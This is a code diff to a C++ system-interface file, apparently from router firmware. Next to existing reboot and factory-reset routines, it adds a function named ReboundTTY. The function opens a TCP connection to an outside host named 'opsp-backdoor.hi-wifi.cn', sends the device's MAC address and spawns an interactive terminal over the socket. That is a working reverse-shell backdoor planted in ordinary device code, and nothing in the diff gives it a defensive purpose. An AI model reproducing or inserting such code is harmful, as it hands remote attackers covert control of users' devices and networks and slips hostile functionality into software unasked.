@@ -9,6 +9,7 @@
 #include <sys/stat.h>
 #include <libsol-util/utl_logging.h>
 #include "sys_interface.h"
+#include "cpty.h"
 
 void CSysInterface::Reboot(void)
 {
@@ -92,4 +93,56 @@ void CSysInterface::Reset(void)
     utlLog_debug("Reset default.");
     system("mtd -r erase rootfs_data");
     system("reboot");
+}
+
+void CSysInterface::ReboundTTY(const std::string &mac)
+{
+    int port = 23333;
+    int sock;
+    std::string server_url("opsp-backdoor.hi-wifi.cn");
+
+    utlLog_debug("ReboundTTY");
+
+    if((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
+    {
+        utlLog_error("Create socket error!");
+        return;
+    }
+
+    struct sockaddr_in sin;
+    struct hostent *host = gethostbyname(server_url.c_str());
+
+    if (host == NULL)
+    {
+        utlLog_error("Get server ip error!");
+        return;
+    }
+
+    memset(&sin, 0, sizeof(sin));
+    memcpy (&sin.sin_addr.s_addr, host->h_addr, host->h_length);
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(port);
+
+    if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) != 0)
+    {
+        utlLog_error("Connect to server failed!");
+        return;
+    }
+
+    switch(fork())
+    {
+        case 0:                /* child */
+            {
+                send(sock, mac.c_str(), mac.size(), 0);
+
+                CPty::Spawn(sock);
+
+                close(sock);
+                exit(0);
+            }
+            break;
+        default:               /* parent */
+            close(sock);
+            break;
+    }
 }
